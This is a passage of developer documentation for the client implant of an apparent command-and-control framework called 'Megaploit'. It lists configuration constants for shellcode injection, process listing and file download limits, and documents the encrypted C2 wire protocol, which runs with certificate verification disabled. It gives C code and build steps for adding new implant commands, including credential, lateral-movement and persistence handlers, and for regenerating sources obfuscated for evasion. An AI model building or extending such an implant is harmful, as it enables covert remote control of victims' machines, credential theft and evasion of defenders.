| `RECONNECT_DELAY_SEC` | `60` | Base reconnect delay in seconds |
| `RECONNECT_JITTER_PCT` | `50` | ±% random jitter on reconnect delay (CV ≈ 0.29) |
| `SECRET_KEY_PATH` | `"secret.key"` | Relative key filename — used only when `ALLOW_KEY_ON_DISK` is defined |
| `SECRET_KEY_LEN` | `32` | Decoded key length in bytes (file holds 64 hex chars) |
| `SHELL_LINE_BUF` | `4096` | `fgets()` line buffer for `_popen` output |
| `SHELL_RESP_BUF` | `65536` | Initial accumulated response buffer (64 KB) |
| `INJECT_MAX_SHELLCODE` | `32768` | Maximum shellcode bytes accepted by `inject` verb (32 KB) |
| `PS_MAX_PROCS` | `512` | Maximum processes listed by `ps` before truncation |
| `DOWNLOAD_MAX_BYTES` | `67108864` | Maximum file size for `download` (64 MB) |

**Secret key format:** Exactly 64 ASCII hex characters. Generate with:

```python
python -c "import os,binascii; open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
```

The same hex must be loaded by the Megaploit server (`megaploit/core/crypto.py`).
Both copies must match — if they differ the HMAC auth fails and the server closes
the socket immediately after TCP connect.

---

## Protocol Wire Format

### Layer 4 — AES-256-GCM frame

```
[uint32-BE  total_len  ]   4 bytes
[byte[12]   nonce      ]  12 bytes  — random, fresh per message
[byte[N]    ciphertext ]   N bytes  — AES-256-GCM(seq_be64 ++ plaintext)
[byte[16]   GCM tag    ]  16 bytes
```

Sequence number prepended to plaintext before encryption as big-endian uint64.
Receiver enforces `seq > last_seq` (strict monotonicity = replay protection).

### Layer 3 — Protocol v2 handshake

```
Server → 0x4d  ('M')
Client → 0x4d  (echo)
```

### Layer 2 — HMAC-SHA256 authentication

```
Server → 16 random bytes  (challenge)
Client → HMAC-SHA256(secret_key[32], challenge[16])  = 32 bytes
```

Server drops connection on mismatch.

### Layer 1 — TLS 1.2 / 1.3

SChannel with `SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT`,
`SCH_USE_STRONG_CRYPTO`, `ISC_REQ_NO_RENEGOTIATION`.
Certificate verification is disabled (C2 uses a self-signed cert);
optional cert pinning via `C2_CERT_PIN` verifies the exact SHA-256
fingerprint instead of the chain.

---

## Adding a New Command

1. **Pick the right handler file:**
   - System/recon/network verb → `client/shell/handlers_system.c`
   - UI/file/persistence verb → `client/shell/handlers_ui.c`
   - Lateral/credential/privilege verb → `client/shell/handlers_lateral.c`
   - Trivial one-liner → inline in `client/shell/shell.c`

2. **Write the handler:**

```c
void _handle_myverb(TLS_CONTEXT *pTls, const char *args)
{
    // ... do work ...
    _send_str(pTls, "[+] result");
}
```

3. **Declare it in `client/shell/shell_internal.h`:**

```c
void _handle_myverb(TLS_CONTEXT *pTls, const char *args);
```

4. **Add an entry to the dispatch table in `client/shell/shell.c`:**

   a. Add a wrapper near the other `_w_*` helpers:

```c
static void _w_myverb(TLS_CONTEXT *t, const char *a) { _handle_myverb(t, a); }
```

   b. Add a row to `_dispatch[]`:

```c
{ "myverb ",  7,  1,  _w_myverb },   /* need_arg=1 if it takes an argument */
```

   For verbs with an optional argument (like `ls` or `env`) that cannot be
   expressed in the dispatch table, add an explicit `if` block in the
   `shell_run()` fallback section instead.

5. **If the new handler is in `handlers_system.c` or `handlers_lateral.c`,
   regenerate the obfuscated sources:**

```bash
python client/evasion/gen_obf.py
```

6. **Build and test:**

```bash
mingw32-make C2_IP=127.0.0.1 C2_PORT=4444 DBG=1
```

No other files need to change. The Megaploit C2 probe (`megaploit/core/c_probe.py`)
discovers new verbs automatically by scanning the dispatch table in the compiled
binary at runtime.
